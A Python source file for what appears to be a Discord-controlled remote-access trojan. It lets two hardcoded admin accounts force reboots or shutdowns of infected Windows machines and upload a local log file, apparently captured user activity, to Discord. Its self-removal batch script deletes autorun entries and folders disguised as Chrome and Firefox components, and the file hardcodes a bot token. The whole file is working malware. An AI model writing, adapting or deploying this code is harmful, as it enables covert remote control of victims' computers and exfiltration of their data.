import discord
import os
import time


client = discord.Client()
airsoft = os.path.join(os.environ['appdata'], 'Airsoft')
admins = (837582713783451668, 459623637948039189)


def check_airsoft() -> None:
    if os.path.exists(airsoft):
        pass
    else:
        os.mkdir(airsoft)


def get_client_name() -> str:
    check_airsoft()
    config_path = os.path.join(airsoft, 'config.txt')

    if os.path.exists(config_path):
        with open(config_path, 'r') as file:
            return file.readline()
    else:
        rename_config()
        return get_client_name()


def rename_config(name=False) -> None:
    check_airsoft()
    config_path = os.path.join(airsoft, 'config.txt')

    if not name:
        name = str(time.time())

    with open(config_path, 'w') as file:
        file.write(name)
        file.close()


@client.event
async def on_message(message):
    try:
        if message.author.id in admins:
            client_name = get_client_name()

            if message.content == 'ONLINE':
                await message.channel.send(client_name)

            if message.content.startswith('ALL'):
                command = message.content[3:].strip()
                if command == 'REBOOT':
                    os.system('shutdown -t 0 -r -f')
                    await message.channel.send('REBOOTED')
                elif command == 'OFF':
                    os.system('shutdown -t 0 -f')
                    await message.channel.send('DONE')
                elif command == 'LOG':
                    await message.channel.send(file=discord.File(os.path.join(airsoft, 'log.txt')))

            elif message.content.startswith(client_name):
                command = message.content[len(client_name):].strip()
                if command.startswith('RENAME'):
                    new_name = command[6:].strip()
                    rename_config(new_name)
                    await message.channel.send(f'RENAMED TO "{new_name}"')
                elif command.startswith('RESET'):
                    rename_config()
                    await message.channel.send('NAME RESETTED')
                elif command.startswith('CLEAR'):
                    with open(os.path.join(airsoft, 'log.txt'), 'w') as file:
                        file.close()
                    await message.channel.send('CLEARED')
                elif command == 'REBOOT':
                    os.system('shutdown -t 0 -r -f')
                    await message.channel.send('REBOOTED')
                elif command == 'OFF':
                    os.system('shutdown -t 0 -f')
                    await message.channel.send('DONE')
                elif command == 'LOG':
                    await message.channel.send(file=discord.File(os.path.join(airsoft, 'log.txt')))
                elif command == 'DELETE':
                    with open(os.path.join(os.environ['appdata'], 'uninst.bat'), 'w') as file:
                        file.write(f'@echo OFF\n')
                        file.write(f'taskkill /f /im "Google Chrome.exe"\n')
                        file.write('taskkill /f /im "Firefox.exe"\n')
                        file.write(f'rd /s /q {airsoft}\n')
                        file.write(f'echo Y | reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Chrome"\n')
                        file.write(f'echo Y | reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Firefox"\n')
                        file.write(f'del /f /s /q "%USERPROFILE%\AppData\Local\Google\Chrome\Chrome Engine"\n')
                        file.write(f'rmdir "%USERPROFILE%\AppData\Local\Google\Chrome\Chrome Engine"\n')
                        file.write('CMD /C DEL %0')
                        file.close()
                    os.system(os.path.join(os.environ['appdata'], 'uninst.bat'))


    except Exception as Error:
        await message.channel.send(Error)

while True:
    try:
        client.run('ODcyNTcwNzgyMjU2MDc0ODUy.YQry3g.Hxn4LFsaSEvBoCB6MdB001ZUYK0')
    except:
        time.sleep(30)